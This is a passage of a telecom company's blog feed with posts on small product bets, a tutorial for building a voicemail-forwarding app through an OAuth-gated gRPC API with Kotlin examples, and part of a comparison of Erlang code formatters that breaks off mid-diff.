4. Test and learn early</p><p>This is especially true for companies with systems that rely on telecom operators. A company that wants access to, or change part of, a solution that has to do with telecommunication has to contact their operators, then the operator typically has to contact their vendor, then the vendor typically creates a change request ticket in their system, and then finally they get back with a fix.</p><p>Adding that long wait to what should have been “built quickly” is exactly how they go from many small bets to 1 big bet.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="giving-up">Giving up<a class="hash-link" href="#giving-up" title="Direct link to heading">​</a></h2><p>The end result, be it from the 1 big bet approach or a failed digital department, is that the big company decides to “get back to basics”, “stick with what they know”, and “strengthen the core business” - meaning that they have entirely given up trying to create new products that people love.</p><p>The customers miss out on great new products, employees leave, and the business suffers.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="a-new-hope">A new hope<a class="hash-link" href="#a-new-hope" title="Direct link to heading">​</a></h2><p>Our company got started because of this pain. Getting access to a mobile core network to create even small products is hard.</p><p>If you are lucky enough to actually get access, what you will see is a closed, uniquely configured core network built on top of nodes from external vendors. Add to the mix that you need people who actually know how to build anything on top of old telecom protocols and you have a perfect storm. If you have all of this and somehow are able to build a successful product, guess what? It doesn’t scale to any other operator because they also have their own uniquely configured core network. And the privilege of getting access is reserved for employees and an exclusive list of vendors. If you are an independent product company who wants to build something cool you can forget about it!</p><p>This is why we built a mobile core network from scratch on top of AWS. Long story short this means that every operator using our core can use any product that is built with the <a href="http://developer.wgtwo.com/" target="_blank" rel="noopener noreferrer">wgtwo developer portal</a>.</p><p>We believe that subscribers will start to expect that they can add a range of valuable products to their subscription. This means going from a world where everyone gets the same standardized service from their operator - to a world where subscribers are treated as individuals who are free to activate the products that they want.</p><p>The way we do this is by enabling 3rd party developers (you!) to create products, and matching these products with operators so that the products are brought to the market for subscribers to enjoy.</p><p>In short, with the wgtwo developer portal, it is possible to build quickly, so you can test and learn early, making it possible to reduce the size of your bets, and increasing the chance of building great products that people love!</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="try-it-out-and-join-us">Try it out and join us<a class="hash-link" href="#try-it-out-and-join-us" title="Direct link to heading">​</a></h2><p>We hope to get your feedback so that we can keep our bets small, and keep learning!</p><p>Want to read about the first product we created, and how you can do the same using the developer portal? Check out my teammate David’s post on <a href="https://wgtwo.com/blog/building-software-for-a-telecom-core-network" target="_blank" rel="noopener noreferrer">Building software for a telecom core network</a>.</p><p>Join us at <a href="https://tadhack.com/2020/global/tadhack-trondheim-norway/" target="_blank" rel="noopener noreferrer">TADHack remotely</a> or at one of our locations in <a href="https://tadhack.com/2020/global/tadhack-trondheim-norway/" target="_blank" rel="noopener noreferrer">Trondheim</a> or <a href="https://tadhack.com/2020/global/tadhack-stockholm-sweden/" target="_blank" rel="noopener noreferrer">Stockholm</a> on October 10 and 11. It’s completely free, and you will get to play around with our APIs, meet some cool people, eat, drink and have fun. Hope to see you there!</p>]]></content>
        <author>
            <name>Marius Waldum</name>
            <uri>https://www.linkedin.com/in/mariuswaldum/</uri>
        </author>
        <category label="telecom" term="telecom"/>
        <category label="software-development" term="software-development"/>
        <category label="core-network" term="core-network"/>
        <category label="app-ecosystem" term="app-ecosystem"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Building software for a telecom core network]]></title>
        <id>building-software-for-a-telecom-core-network</id>
        <link href="https://www.wgtwo.com/blog/building-software-for-a-telecom-core-network"/>
        <updated>2020-08-21T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[One of the goals of wgtwo is to enable operators and third parties to build products and services for the “core network” of the telecom stack. In short, this means providing API access to a subscription’s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.]]></summary>
        <content type="html"><![CDATA[<p>One of the goals of <strong>wgtwo</strong> is to enable operators and third parties to build products and services for the “core network” of the telecom stack. In short, this means providing API access to a subscription’s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-product">The product<a class="hash-link" href="#the-product" title="Direct link to heading">​</a></h2><p>One of the most common complaints people have with their Voicemail service in Europe is that you have to call in to your Voicemail to listen to your messages. In order to play the message, you have to navigate through a slow voice menu using your dialpad. We believed this would be easy to improve.</p><p>Our product idea was simple. When Alice leaves a voicemail message for Bob, Bob receives this message either as an audio file or as a speech-to-text transcript.</p><p><img alt="VoiceBox splash screen" src="/assets/images/voicebox-splash-6d10dc0d5c9ca95802530f5fd836ef96.png" width="360" height="640">
<img alt="VoiceBox home screen" src="/assets/images/voicebox-home-068b8f7a8c60ed57cf2d95e6ae99693e.png" width="360" height="640">
<img alt="Android messaging app" src="/assets/images/message-inbox-88042532d7ac1cfaebdfba3e6afb2509.png" width="360" height="640"></p><p>The product idea isn’t what most people would call revolutionary, but almost all of the world's mobile operators have hermetically sealed core networks. This means it would be impossible to build this product without lawyering up and coming to some sort of agreement with one of them. The <strong>wgtwo</strong> core network, however, is open and provides API access to Voicemail, MMS and SMS  (among other things), which is just what we need to build our product.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="developing-on-the-wgtwo-platform">Developing on the <strong>wgtwo</strong> platform<a class="hash-link" href="#developing-on-the-wgtwo-platform" title="Direct link to heading">​</a></h2><p>To create a product on the <strong>wgtwo</strong> platform, the first thing you have to do is create a free developer account at <a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer"></a><a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer">https://developer.wgtwo.com</a>. Once you have signed up, you have to create an Organization and add a Product to that organization.</p><p>You can specify what permissions your product will require in the <code>Product &gt; Scopes</code> tab:</p><p><img alt="Developer Portal Scopes Screen" src="/assets/images/developer-portal-scopes-ef5c424f0dff92f40ac64b2a4fd748bd.png" width="740" height="709"></p><p>In an ideal world, VoiceBox would work like this:</p><ol><li>The subscriber signs in and enables the desired functionality in VoiceBox.</li><li>The next time the subscriber receives a voicemail, an event is fired by <strong>wgtwo</strong>’s core network, which VoiceBox receives.</li><li>VoiceBox triggers an SMS/MMS send using our APIs.</li><li>The subscriber receives an SMS/MMS from the sender “VoiceBox”.</li></ol><p>In a few months time this ideal world should be reality, but at the time of writing (mid August 2020) we’re missing the events API and the “Send from Product” API. Currently VoiceBox works like this (changes are highlighted):</p><ol><li>The subscriber signs in and enables the desired functionality in VoiceBox.</li><li>The next time the subscriber receives a voicemail, <strong>VoiceBox will discover it by polling</strong>.</li><li>VoiceBox triggers an MMS send using our APIs.</li><li>The subscriber receives an <strong>MMS from their own number</strong>.</li></ol><p>It’s not perfect, but it still demonstrates the potential of the platform. None of this can happen without the subscriber’s consent though, so in the next section we’ll have a look at how that works.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="obtaining-user-consent">Obtaining user consent<a class="hash-link" href="#obtaining-user-consent" title="Direct link to heading">​</a></h2><p>The app we're building is touching sensitive data, and we can't do that without asking the subscriber if it’s okay. The <strong>wgtwo</strong> platform includes an OAuth implementation with SMS authentication, which means that we can be reasonably sure that the subscriber has consented.</p><p>When a subscriber opens VoiceBox for the first time, they’re met with a login page, and after completing a pin challenge they arrive at an OAuth consent screen. Here they have to accept the terms of VoiceBox, as well as all the required scopes.</p><p>The login is branded to look like the product (notice the pink action button), while the consent screen is branded to look like the operator (in our case this is <a href="https://vimla.se" target="_blank" rel="noopener noreferrer">Vimla</a>, a Swedish operator which uses our platform):
<img alt="ID login screen" src="/assets/images/msisdn-screen-0938beb47bb12752909ad9b10912f9c4.png" width="360" height="640">
<img alt="ID pin screen" src="/assets/images/pin-screen-c16025eef0a1d6621d3c29fc54a045fa.png" width="360" height="640">
<img alt="ID consent screen" src="/assets/images/consent-screen-f6be7afcb64d2bfd259bf029a73a9b16.png" width="360" height="640"></p><p>Our platform has a standard <a href="https://oauth.net/2/" target="_blank" rel="noopener noreferrer">OAuth 2</a> flow. When the subscriber taps “Accept”, <strong>wgtwo</strong> redirects the subscriber to the third-party, which receives an "access token" that allows them to act on behalf of the subscriber. In this case the access token will let the third-party fetch Voicemails and send MMS from the subscriber, so it’s important to keep it safe.
Next we’ll look at using this access token to perform actions on the subscriber's behalf.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="connecting-to-the-wgtwo-api">Connecting to the <strong>wgtwo</strong> API<a class="hash-link" href="#connecting-to-the-wgtwo-api" title="Direct link to heading">​</a></h2><p>All <strong>wgtwo</strong> APIs are <a href="https://grpc.io/" target="_blank" rel="noopener noreferrer">gRPC</a>. This can be a bit intimidating if you are used to REST APIs, but luckily we also have official Java clients distributed through Maven/JitPack. If you want to use a different language you can generate your own client using our public proto files. One of the benefits of gRPC is that you don’t have to ever write your own rest adapter for the API.</p><p>Let’s have a look at how you can fetch a Voicemail file:</p><div class="codeBlockContainer_I0IT language-kotlin theme-code-block"><div class="codeBlockContent_wNvx kotlin"><pre tabindex="0" class="prism-code language-kotlin codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">fun getVoicemail(user: User, uuid: String): Voicemail? {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val getVoicemailRequest = VoicemailProto.GetVoicemailRequest.newBuilder().setVoicemailId(uuid).build()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val voicemail = try {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        blockingStub</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                .getVoicemail(getVoicemailRequest)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } catch (e: StatusRuntimeException) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        logger.warn("Error getting voicemail $uuid; ${e.message}")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        throw e</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    if (voicemail.metadata) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return Voicemail(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            ... // we map the gRPC voicemail object to a VoiceBox specific object</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } else {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        logger.warn("No voicemail metadata for $uuid")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return null</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We use the official <strong>wgtwo</strong> API client to fetch a voicemail based on the UUID of the voicemail, which we polled for earlier (code not shown).</p><p>Unlike with REST APIs, we don't have to think about writing client code and handling HTTP responses, this is taken care of by the gRPC client library.</p><p>Once we have the voicemail, we send it to the subscriber using their own number as the sender:</p><div class="codeBlockContainer_I0IT language-kotlin theme-code-block"><div class="codeBlockContent_wNvx kotlin"><pre tabindex="0" class="prism-code language-kotlin codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">fun sendMms(user: User, phone: Msisdn, audio: ByteString) = try {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val request = MmsProto.SendMessageFromSubscriberRequest</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .newBuilder()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .addMessageContent(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                MmsProto.MessageContent.newBuilder().setAudio(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    MmsProto.AudioContent.newBuilder().setWav(audio)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .setToE164(phone.toPhoneNumberProto()) // the receiver is the same as the sender</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .setFromSubscriber(phone.toPhoneNumberProto()) // the sender is the same as the receiver</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .build()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val response = blockingStub</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            .sendMessageFromSubscriber(request)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    if (response.status == MmsProto.SendResponse.SendStatus.SEND_OK) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } else {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        logger.warn("Unable to send MMS to ${phone.e164}: ${response.description} (${response.status.name})")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        false</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} catch (e: Exception) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    logger.warn("Unable to send MMS to ${phone.e164}: ${e.message}")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    false</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This is also pretty straightforward, except for the part where the sender is also the receiver. In the future this will be a bit less confusing, since we’ll be sending the MMS from the product (“VoiceBox”) instead of the subscriber itself.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>As you can see, we’re still in the early stages of our developer platform. In the coming year, we will be adding a lot more APIs, as well as building an app-store where subscribers can browse products that they want to add to their subscription. We believe opening up the core network in this way will allow third-party developers to build incredible apps that will lead to much happier subscribers, which will in turn lead to subscriber growth for operators on our platform.</p><p>At the time of writing, all apps on the platform have to be free, but we are working on a monetization model similar to that of the Apple and Google app-stores. Our main priority is to come up with a model that is fair to both third-party developers and operators.</p><p>If you’re interested in our platform, please head on over to <a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer"></a><a href="https://developer.wgtwo.com" target="_blank" rel="noopener noreferrer">https://developer.wgtwo.com</a> and create an account. If you have any questions please contact us at <a href="mailto:products@wgtwo.com" target="_blank" rel="noopener noreferrer">products@wgtwo.com</a>.</p>]]></content>
        <author>
            <name>David Åse</name>
            <uri>https://linkedin.com/in/davidaase</uri>
        </author>
        <category label="telecom" term="telecom"/>
        <category label="software-development" term="software-development"/>
        <category label="core-network" term="core-network"/>
        <category label="app-ecosystem" term="app-ecosystem"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Choosing an Erlang formatter]]></title>
        <id>choosing-erlang-formatter/</id>
        <link href="https://www.wgtwo.com/blog/choosing-erlang-formatter/"/>
        <updated>2020-05-18T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[There are many different Erlang formatters, and as a hack day project]]></summary>
        <content type="html"><![CDATA[<p>There are many different Erlang formatters, and as a hack day project
I investigated which options exist for us at <strong>wgtwo</strong>. There
are two main alternatives, but sadly both have problems.  I've also
briefly looked at an Erlang linter.</p><h1>Background</h1><p>In <strong>wgtwo</strong> we use a bunch of different programming
languages, and we all have different experiences and are used to
different languages and environments. We are pretty autonomous and we
are expected to jump in and out in different services to fix bugs and
add features.</p><p>We like when the code is uniform, because it makes it easier to focus
on the business logic. That is why we want to use tools to make sure
our code is consistent no matter who is the author, or which IDE is
used, or in which part of the system the code resides.</p><p>About half a year ago there was a discussion about code style within
<strong>wgtwo</strong> that resulted in formatting tools being applied for
Kotlin, Bazel, Go and Java. It also resulted in an internal wiki page
containing guidelines about code style.</p><p>That document highlights some of the problems with mixing different
code-styles. It should be easy for newcomers to maintain the coding
style. It should also be easy to read diffs, and the discussions about
code style and formatting will be minimized because there is a
concensus.</p><h1>This is nice, I want it for Erlang</h1><p>As some of our services are written in Erlang, I wanted to investigate
which formatters exist for Erlang, and what state they are in. I used
our last hack day for this purpose.</p><p>The requirements I had was that it should be reproducable. Calling the
formatter multiple times should not change the structure more than
once (first time of being called). The formatter should also
preferably work with rebar3 (the most used Erlang build tool).  The
tool should not use external tooling that wouldn't work for all
developers flow.</p><p>I also wanted it to have a short execution time, at least after the
initial formatting.</p><h1>Benchmark</h1><p>I searched for formatting tools on hex.pm, github.com, duckduckgo.com,
google.com and came up with the following arbitrary list of Erlang
formatters. There is probably others, but these seems to be the most
used.</p><ul><li>rebar3_fmt</li><li>steamroller</li><li>otp/erl_tidy</li><li>tsloughter/erl_tidy</li><li>rebar3_format</li><li>eryngii</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="rebar3_fmt"><a href="https://github.com/fenollp/erlang-formatter" target="_blank" rel="noopener noreferrer">rebar3_fmt</a><a class="hash-link" href="#rebar3_fmt" title="Direct link to heading">​</a></h2><p>One big problem with this is that it uses Emacs <code>erlang-mode</code> for
formatting. Sure, I am an Emacs user and the <code>erlang-mode</code> and its
formatting is maintained and supperted by OTP, but my non-Emacs
coworkers would not be happy if they need to install Emacs every time
they want to format the code.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="steamroller"><a href="https://github.com/old-reliable/steamroller/" target="_blank" rel="noopener noreferrer">steamroller</a><a class="hash-link" href="#steamroller" title="Direct link to heading">​</a></h2><p>Though it was easy to setup (just add it to dependencies in your Rebar
config and run <code>rebar3 steamroll</code>), my first impression of the
execution was that it was really slow. Even when running subsequent
calls on my Dell XPS 13 P82G it took around 3.5 minutes to format.</p><p>The plugin had some support for increasing the number of workers from
the default <code>--J=1</code>, but that did not seem to help with the execution
time.</p><p>The default steamroller formatting options specify 2 spaces instead of
the <code>erlang-mode</code> 4 spaces standard that is used in our code base.</p><p>Here is a sample of a complex record structure</p><div class="codeBlockContainer_I0IT language-diff theme-code-block"><div class="codeBlockContent_wNvx diff"><pre tabindex="0" class="prism-code language-diff codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                   components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                       [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                         #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                            invokeID = 1,linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                            operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                            parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                   imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                   'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                   'vlr-Number' = CallingGTBCD}}}]},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">   components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">     [</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">       {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           invokeID = 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">             #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">               imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">               'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">               'vlr-Number' = CallingGTBCD</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">             }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">       }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">     ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"> },</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>I was quite happy with the results, even though they were slow, until
I saw how it treated maps</p><div class="codeBlockContainer_I0IT language-diff theme-code-block"><div class="codeBlockContent_wNvx diff"><pre tabindex="0" class="prism-code language-diff codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">      parameters =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">          #{called_party_addr =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                ... },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">            calling_party_addr =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                ... },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">            data =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                #'Continue'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" 